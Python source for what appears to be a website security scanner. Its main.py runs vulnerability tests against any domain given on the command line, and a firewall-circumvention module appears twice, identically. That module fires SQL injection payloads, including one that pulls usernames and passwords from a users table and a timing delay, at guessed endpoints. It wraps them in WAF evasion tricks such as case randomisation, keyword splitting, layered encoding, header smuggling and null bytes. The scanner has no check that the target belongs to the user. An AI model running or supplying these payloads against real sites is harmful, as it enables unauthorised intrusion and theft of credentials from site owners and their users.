# main.py

import sys
from termcolor import colored
import concurrent.futures

# Import all the test modules
from tests import (
    ssl_tls,
    headers,
    xss,
    sql_injection,
    content_discovery,
    csrf,
    directory_traversal,
    idor,
    file_upload,
    unvalidated_redirects,
    security_misconfiguration,
    sensitive_data_exposure,
    authentication,
    http_methods,
    cookie_settings,
    clickjacking,
    third_party_vulnerabilities,
    firewall_circumvention,  # Import the firewall circumvention script
)

def is_valid_domain(domain):
    import re
    pattern = re.compile(
        r'^(?:[a-zA-Z0-9]'       # First character of the domain
        r'(?:[a-zA-Z0-9-]{0,61}'  # Sub domain + hostname
        r'[a-zA-Z0-9])?\.)'       # Domain name
        r'+[a-zA-Z]{2,6}$'        # Top level domain
    )
    return pattern.match(domain)

def main():
    if len(sys.argv) < 2:
        print("Usage: python main.py <domain> [-fc]")
        sys.exit(1)
    
    domain = sys.argv[1]

    if not is_valid_domain(domain):
        print("Invalid domain format.")
        sys.exit(1)

    # Check if the firewall circumvention option is enabled
    enable_firewall_circumvention = '-fc' in sys.argv

    print(colored(f"Starting security scan on {domain}\n", "cyan"))

    # Initialize results dictionary
    results = {
        'passed': [],
        'failed': [],
        'firewall_blocked': []
    }

    # List of test functions and their names
    test_functions = [
        ('SSL/TLS Check', ssl_tls.check_ssl_certificate),
        ('HTTP Headers Check', headers.check_headers),
        ('XSS Vulnerability', xss.test_xss),
        ('SQL Injection Vulnerability', sql_injection.test_sql_injection),
        ('Content Discovery', content_discovery.content_discovery),
        ('CSRF Protection', csrf.check_csrf_protection),
        ('Directory Traversal', directory_traversal.test_directory_traversal),
        ('Insecure Direct Object References', idor.test_idor),
        ('File Upload Vulnerability', file_upload.test_file_upload),
        ('Unvalidated Redirects and Forwards', unvalidated_redirects.test_unvalidated_redirects),
        ('Security Misconfiguration', security_misconfiguration.check_security_misconfiguration),
        ('Sensitive Data Exposure', sensitive_data_exposure.check_sensitive_data_exposure),
        ('Broken Authentication and Session Management', authentication.test_authentication),
        ('HTTP Methods Allowed', http_methods.check_http_methods),
        ('Cookie Security Settings', cookie_settings.check_cookie_settings),
        ('Clickjacking Vulnerability', clickjacking.test_clickjacking),
        ('Third-Party Library Vulnerabilities', third_party_vulnerabilities.check_third_party_vulnerabilities),
    ]

    # Include firewall circumvention test if the option is enabled
    if enable_firewall_circumvention:
        print(colored("Firewall Circumvention Test enabled.\n", "yellow"))
        test_functions.append(('Firewall Circumvention Test', firewall_circumvention.test_firewall_circumvention))

    # Run tests in parallel using ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_test = {executor.submit(func, domain): name for name, func in test_functions}
        for future in concurrent.futures.as_completed(future_to_test):
            name = future_to_test[future]
            try:
                result = future.result()
            except Exception as exc:
                result = {
                    'status': False,
                    'details': f"Test generated an exception: {exc}",
                    'remediation': "Check the test implementation and ensure the target domain is accessible."
                }

            # Categorize the results
            if "firewall" in result['details'].lower():
                results['firewall_blocked'].append((name, result))
            elif result['status']:
                results['passed'].append((name, result))
            else:
                results['failed'].append((name, result))

    # Display results
    print(colored("\nSecurity Scan Results:\n", "cyan", attrs=['bold']))

    # Display Passed Tests
    print(colored("✔ Passed Tests:\n", "green", attrs=['bold', 'underline']))
    if results['passed']:
        for test, result in results['passed']:
            print(f"{test}: {colored('✔ Passed', 'green')}")
            if result['details']:
                print(f"Details: {result['details']}\n")
    else:
        print("No tests passed.\n")

    # Display Failed Tests
    print(colored("✖ Failed Tests:\n", "red", attrs=['bold', 'underline']))
    if results['failed']:
        for test, result in results['failed']:
            print(f"{test}: {colored('✖ Failed', 'red')}")
            if result['details']:
                print(f"Details: {result['details']}")
            if result.get('remediation'):
                print(colored(f"Remediation: {result['remediation']}\n", "yellow"))
    else:
        print("No failed tests.\n")

    # Display Tests Blocked by Firewall
    print(colored("⚠ Tests Blocked by Firewall:\n", "yellow", attrs=['bold', 'underline']))
    if results['firewall_blocked']:
        for test, result in results['firewall_blocked']:
            print(f"{test}: {colored('⚠ Blocked by Firewall', 'yellow')}")
            if result['details']:
                print(f"Details: {result['details']}")
            if result.get('remediation'):
                print(colored(f"Remediation: {result['remediation']}\n", "yellow"))
    else:
        print("No tests were blocked by the firewall.\n")

if __name__ == "__main__":
    main()
# tests/firewall_circumvention.py

import requests
import base64
import random
import urllib.parse
import time
from tests.firewall_detection import check_for_firewall

def random_case(payload):
    """Randomly changes the case of each character in the payload"""
    return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

def add_padding(payload):
    """Adds random padding around the payload to bypass detection"""
    junk = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=5))
    return f"{junk}{payload}{junk}"

def add_spaces_in_keywords(payload):
    """Adds spaces in SQL keywords to avoid detection"""
    replacements = {
        "SELECT": "SE LECT", "UNION": "UN ION", "AND": "A ND", "OR": "O R", "FROM": "F ROM"
    }
    for keyword, spaced in replacements.items():
        payload = payload.replace(keyword, spaced)
    return payload

def multiple_encoding(payload):
    """Applies multiple layers of encoding (URL, Base64, Hex)"""
    hex_encoded = ''.join([f"%{hex(ord(char))[2:]}" for char in payload])
    url_encoded = urllib.parse.quote(hex_encoded)
    base64_encoded = base64.b64encode(url_encoded.encode()).decode()
    return base64_encoded

def test_firewall_circumvention(domain):
    result = {'status': True, 'details': '', 'remediation': ''}
    paths = ["/vulnerable_endpoint", "/login", "/admin", "/search", "/api"]  # Test multiple possible endpoints
    
    techniques = [
        {'name': 'Standard SQL Injection', 'payload': "' OR '1'='1", 'method': 'GET'},
        {'name': 'URL Encoded', 'payload': urllib.parse.quote("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Hex Encoded', 'payload': ''.join([f"%{hex(ord(char))[2:]}" for char in "' OR '1'='1"]), 'method': 'GET'},
        {'name': 'Multiple Encoding', 'payload': multiple_encoding("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Case Manipulation', 'payload': random_case("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Padded Payload', 'payload': add_padding("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Space-injected SQL', 'payload': add_spaces_in_keywords("' UNION SELECT 1, username, password FROM users--"), 'method': 'GET'},
        {'name': 'HTTP Header Smuggling', 'payload': "' OR '1'='1", 'method': 'GET', 'headers': {'Content-Length': '0', 'Transfer-Encoding': 'chunked'}},
        {'name': 'Non-standard HTTP Method', 'payload': "' OR '1'='1", 'method': 'PROPFIND'},
        {'name': 'Chunked Transfer Encoding', 'payload': "0\r\n\r\n", 'method': 'POST', 'chunked': True},
        {'name': 'Timing-based Delay', 'payload': "'; WAITFOR DELAY '00:00:10';--", 'method': 'GET'},
        {'name': 'Null Byte Injection', 'payload': "%00' OR '1'='1", 'method': 'GET'},
        {'name': 'HTTP/2 Protocol', 'payload': "' OR '1'='1", 'method': 'GET', 'http_version': '2'},
        {'name': 'HTTP/3 Protocol', 'payload': "' OR '1'='1", 'method': 'GET', 'http_version': '3'},
    ]

    for path in paths:
        for technique in techniques:
            try:
                url = f"https://{domain}{path}"
                method = technique['method']
                payload = technique['payload']

                # Set request parameters or headers as needed
                params = {'input': payload} if method in ['GET', 'OPTIONS', 'PROPFIND'] else None
                data = {'input': payload} if method in ['POST', 'PUT', 'DELETE'] else None
                headers = technique.get('headers', {})
                headers['User-Agent'] = random_case("Mozilla/5.0")

                # Check for chunked transfer encoding
                if technique.get('chunked'):
                    headers['Transfer-Encoding'] = 'chunked'
                    data = f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n"

                response = requests.request(method, url, params=params, data=data, headers=headers, timeout=15)

                # Check if we successfully bypassed the firewall
                firewall_detected, firewall_details = check_for_firewall(response)
                if firewall_detected:
                    result['details'] += f"\nFirewall detected using technique: {technique['name']} on path {path} - {firewall_details}"
                else:
                    result['status'] = False
                    result['details'] += f"\nSuccessfully bypassed firewall using technique: {technique['name']} on path {path}"
                    result['remediation'] = (
                        f"The firewall was bypassed using the '{technique['name']}' evasion technique. "
                        f"Consider tightening firewall rules or adjusting rule sets to prevent this evasion."
                    )
                    return result

                # Delay to avoid triggering WAF rate limits
                time.sleep(1)

            except requests.exceptions.RequestException as e:
                result['status'] = False
                result['details'] += f"\nTest failed for {technique['name']} on path {path}: {str(e)}"
                result['remediation'] = "Ensure firewall rules are comprehensive to detect evasion techniques."

    if result['status']:
        result['details'] = "All firewall circumvention attempts were blocked by the firewall."
    return result
# tests/firewall_circumvention.py

import requests
import base64
import random
import urllib.parse
import time
from tests.firewall_detection import check_for_firewall

def random_case(payload):
    """Randomly changes the case of each character in the payload"""
    return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

def add_padding(payload):
    """Adds random padding around the payload to bypass detection"""
    junk = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=5))
    return f"{junk}{payload}{junk}"

def add_spaces_in_keywords(payload):
    """Adds spaces in SQL keywords to avoid detection"""
    replacements = {
        "SELECT": "SE LECT", "UNION": "UN ION", "AND": "A ND", "OR": "O R", "FROM": "F ROM"
    }
    for keyword, spaced in replacements.items():
        payload = payload.replace(keyword, spaced)
    return payload

def multiple_encoding(payload):
    """Applies multiple layers of encoding (URL, Base64, Hex)"""
    hex_encoded = ''.join([f"%{hex(ord(char))[2:]}" for char in payload])
    url_encoded = urllib.parse.quote(hex_encoded)
    base64_encoded = base64.b64encode(url_encoded.encode()).decode()
    return base64_encoded

def test_firewall_circumvention(domain):
    result = {'status': True, 'details': '', 'remediation': ''}
    paths = ["/vulnerable_endpoint", "/login", "/admin", "/search", "/api"]  # Test multiple possible endpoints
    
    techniques = [
        {'name': 'Standard SQL Injection', 'payload': "' OR '1'='1", 'method': 'GET'},
        {'name': 'URL Encoded', 'payload': urllib.parse.quote("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Hex Encoded', 'payload': ''.join([f"%{hex(ord(char))[2:]}" for char in "' OR '1'='1"]), 'method': 'GET'},
        {'name': 'Multiple Encoding', 'payload': multiple_encoding("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Case Manipulation', 'payload': random_case("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Padded Payload', 'payload': add_padding("' OR '1'='1"), 'method': 'GET'},
        {'name': 'Space-injected SQL', 'payload': add_spaces_in_keywords("' UNION SELECT 1, username, password FROM users--"), 'method': 'GET'},
        {'name': 'HTTP Header Smuggling', 'payload': "' OR '1'='1", 'method': 'GET', 'headers': {'Content-Length': '0', 'Transfer-Encoding': 'chunked'}},
        {'name': 'Non-standard HTTP Method', 'payload': "' OR '1'='1", 'method': 'PROPFIND'},
        {'name': 'Chunked Transfer Encoding', 'payload': "0\r\n\r\n", 'method': 'POST', 'chunked': True},
        {'name': 'Timing-based Delay', 'payload': "'; WAITFOR DELAY '00:00:10';--", 'method': 'GET'},
        {'name': 'Null Byte Injection', 'payload': "%00' OR '1'='1", 'method': 'GET'},
        {'name': 'HTTP/2 Protocol', 'payload': "' OR '1'='1", 'method': 'GET', 'http_version': '2'},
        {'name': 'HTTP/3 Protocol', 'payload': "' OR '1'='1", 'method': 'GET', 'http_version': '3'},
    ]

    for path in paths:
        for technique in techniques:
            try:
                url = f"https://{domain}{path}"
                method = technique['method']
                payload = technique['payload']

                # Set request parameters or headers as needed
                params = {'input': payload} if method in ['GET', 'OPTIONS', 'PROPFIND'] else None
                data = {'input': payload} if method in ['POST', 'PUT', 'DELETE'] else None
                headers = technique.get('headers', {})
                headers['User-Agent'] = random_case("Mozilla/5.0")

                # Check for chunked transfer encoding
                if technique.get('chunked'):
                    headers['Transfer-Encoding'] = 'chunked'
                    data = f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n"

                response = requests.request(method, url, params=params, data=data, headers=headers, timeout=15)

                # Check if we successfully bypassed the firewall
                firewall_detected, firewall_details = check_for_firewall(response)
                if firewall_detected:
                    result['details'] += f"\nFirewall detected using technique: {technique['name']} on path {path} - {firewall_details}"
                else:
                    result['status'] = False
                    result['details'] += f"\nSuccessfully bypassed firewall using technique: {technique['name']} on path {path}"
                    result['remediation'] = (
                        f"The firewall was bypassed using the '{technique['name']}' evasion technique. "
                        f"Consider tightening firewall rules or adjusting rule sets to prevent this evasion."
                    )
                    return result

                # Delay to avoid triggering WAF rate limits
                time.sleep(1)

            except requests.exceptions.RequestException as e:
                result['status'] = False
                result['details'] += f"\nTest failed for {technique['name']} on path {path}: {str(e)}"
                result['remediation'] = "Ensure firewall rules are comprehensive to detect evasion techniques."

    if result['status']:
        result['details'] = "All firewall circumvention attempts were blocked by the firewall."
    return result
